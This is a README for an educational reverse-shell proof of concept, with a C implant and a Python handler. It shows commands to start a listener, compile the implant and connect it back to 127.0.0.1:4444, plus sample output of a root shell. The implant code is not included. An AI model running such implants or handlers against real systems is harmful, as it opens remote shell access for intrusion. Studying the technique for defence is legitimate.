# Reverse-Shell
A proof-of-concept reverse shell (written in C) and its handler (written in Python) for learning and educational purpose. The reverse shell is intended for x86 & x64 Linux based systems. However, by [using a cross-compiler](https://jensd.be/1126/linux/cross-compiling-for-arm-or-aarch64-on-debian-or-ubuntu), it can also be repurposed for ARM64/aarch64 Linux systems as well 

# Usage
This PoC is made of two components, a handler and the implant/reverse shell code. 

First, we execute the handler to listen on a particular address and port. The implant is also compatible with netcat
```bash
python3 python-handler.py 127.0.0.1 4444
```
The implant is also compatible with netcat, so it can also be used to manage a reverse shell connection.
```bash
nc -nvlp 127.0.0.1 4444 -s 127.0.0.1
```

Then, we compile the implant/reverse shell code, and execute it by providing it with handler's listening address and port
```bash
gcc -o implant implant.c
./implant 127.0.0.1 4444
```
You'll see the connection on handler's end
```bash
[+] Handler Started On 127.0.0.1:4444
[+] Listening For Connections ...
[+] Connection Received From 127.0.0.1:58902
id
uid=0(root) gid=0(root) groups=0(root)
```

# Features
- Uses multithreaded handler to simultaneously handle receiving output from reverse shell, while sending commands from user
- Implant/reverse shell uses dup2() call to duplicate STDIN, STDOUT, STDERR across the network socket used to communicate with handler

# To Do
- [ ] Refined error handling on handler and implant's end
- [ ] Implement encryption for communication between handler and implant/reverse shell

# References
- https://pymotw.com/2/socket/tcp.html
- https://www.w3schools.com/python/python_try_except.asp
- https://docs.python.org/3/library/socket.html
- https://cocomelonc.github.io/tutorial/2021/09/11/reverse-shells.html
- https://www.idc-online.com/technical_references/pdfs/information_technology/Pairs_in_Python.pdf
- https://www.w3schools.com/python/python_user_input.asp
- https://www.geeksforgeeks.org/python-convert-string-to-bytes/
- https://g3tsyst3m.github.io/sockets/Create-your-own-Netcat-using-Python/
